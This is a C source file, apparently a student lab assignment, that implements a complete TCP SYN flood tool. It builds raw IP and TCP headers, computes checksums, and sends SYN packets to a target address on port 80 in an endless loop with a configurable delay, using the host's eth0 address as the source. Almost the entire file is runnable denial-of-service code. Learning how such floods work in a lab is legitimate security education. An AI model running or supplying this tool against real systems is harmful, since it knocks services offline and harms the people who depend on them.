/*
 * Assignment 1: TCP SYN Flood Attack
 * Usage: ./syn_flood <target_ip> <timeout_us>
 *
 * Uses the exact packet structure approach from the lab PDF.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>

#define PACKET_LEN 1500
#define TH_SYN 0x02
#define DEST_PORT 80

/* IP Header  */
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3, iph_offset:13;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    struct in_addr     iph_sourceip;
    struct in_addr     iph_destip;
};

/* TCP Header */
struct tcpheader {
    unsigned short tcp_sport;
    unsigned short tcp_dport;
    unsigned int   tcp_seq;
    unsigned int   tcp_ack;
    unsigned char  tcp_offx2;
    unsigned char  tcp_flags;
    unsigned short tcp_win;
    unsigned short tcp_sum;
    unsigned short tcp_urp;
};

/* Pseudo TCP header for checksum */
struct pseudo_tcp {
    unsigned       saddr, daddr;
    unsigned char  mbz;
    unsigned char  ptcl;
    unsigned short tcpl;
    struct tcpheader tcp;
    char payload[1500];
};

/* Internet checksum */
unsigned short in_cksum(unsigned short *buf, int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&temp) = *(unsigned char *)w;
        sum += temp;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/* TCP checksum calculation */
unsigned short calculate_tcp_checksum(struct ipheader *ip)
{
    struct tcpheader *tcp = (struct tcpheader *)((unsigned char *)ip +
                            sizeof(struct ipheader));

    // get tcp_len like iph_len for CPU and subtract ipheader
    int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

    // fill pseudo tcp header for checksum
    struct pseudo_tcp p_tcp;
    memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));
    p_tcp.saddr = ip->iph_sourceip.s_addr;
    p_tcp.daddr = ip->iph_destip.s_addr;
    p_tcp.mbz = 0;
    p_tcp.ptcl = IPPROTO_TCP;
    p_tcp.tcpl = htons(tcp_len);
    memcpy(&p_tcp.tcp, tcp, tcp_len);

    return (unsigned short)in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}

/* Send raw IP packet - matches lab PDF */
void send_raw_ip_packet(struct ipheader *ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket (are you root?)");
        return;
    }

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

/* Get IP of a local interface dynamically */
static uint32_t get_real_ip(const char *iface_name)
{
    struct ifaddrs *ifaddr, *ifa;
    uint32_t ip = 0;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return 0;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (strcmp(ifa->ifa_name, iface_name) != 0) continue;

        struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
        ip = sa->sin_addr.s_addr;
        break;
    }

    freeifaddrs(ifaddr);
    return ip;
}

static void usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <target_ip> <timeout_us>\n", prog);
    fprintf(stderr, "  target_ip  - IPv4 address of the target\n");
    fprintf(stderr, "  timeout_us - delay between packets in microseconds\n");
}

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);

    if (argc != 3) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    /* Parse and validate target IP */
    struct in_addr target_addr;
    if (inet_pton(AF_INET, argv[1], &target_addr) != 1) {
        fprintf(stderr, "Error: invalid target IP '%s'\n", argv[1]);
        return EXIT_FAILURE;
    }

    /* Parse and validate timeout */
    char *endptr = NULL;
    errno = 0;
    long timeout_us = strtol(argv[2], &endptr, 10);
    if (errno != 0 || endptr == argv[2] || *endptr != '\0' ||
        timeout_us < 0 || timeout_us > 10000000) {
        fprintf(stderr, "Error: invalid timeout '%s' (0 - 10000000 us)\n", argv[2]);
        return EXIT_FAILURE;
    }

    // get random seed 
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    // get ip
    uint32_t src_ip = get_real_ip("eth0");
    if (src_ip == 0) {
        fprintf(stderr, "Error: could not get IP for eth0\n");
        return EXIT_FAILURE;
    }

    uint16_t target_port = DEST_PORT;
    unsigned long count = 0;

    printf("[*] SYN Flood -> %s:%u  (delay %ld us)\n",
           argv[1], target_port, timeout_us);
    printf("[*] Press Ctrl+C to stop.\n");

    // send packets in infinite loop
    while (1) {
        char buffer[PACKET_LEN];
        memset(buffer, 0, PACKET_LEN);

        struct ipheader *ip = (struct ipheader *)buffer;
        struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));

        /* Fill TCP header */
        tcp->tcp_sport = htons((unsigned short)(1024 + (rand() % (65535 - 1024))));
        tcp->tcp_dport = htons(target_port);
        tcp->tcp_seq   = rand();
        tcp->tcp_offx2 = 0x50;
        tcp->tcp_flags = TH_SYN;
        tcp->tcp_win   = htons(20000);
        tcp->tcp_sum   = 0;

        /* Fill IP header */
        ip->iph_ver      = 4;
        ip->iph_ihl      = 5;
        ip->iph_tos      = 0;
        ip->iph_ttl      = 50;
        ip->iph_sourceip.s_addr = src_ip;
        ip->iph_destip.s_addr   = target_addr.s_addr;
        ip->iph_protocol = IPPROTO_TCP;
        ip->iph_len      = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        /* Calculate TCP checksum */
        tcp->tcp_sum = calculate_tcp_checksum(ip);

        /* Send */
        send_raw_ip_packet(ip);

        count++;
        if (count % 1000 == 0) {
            printf("[*] Sent %lu SYN packets\n", count);
        }

        if (timeout_us > 0) {
            usleep((useconds_t)timeout_us);
        }
    }

    return EXIT_SUCCESS;
}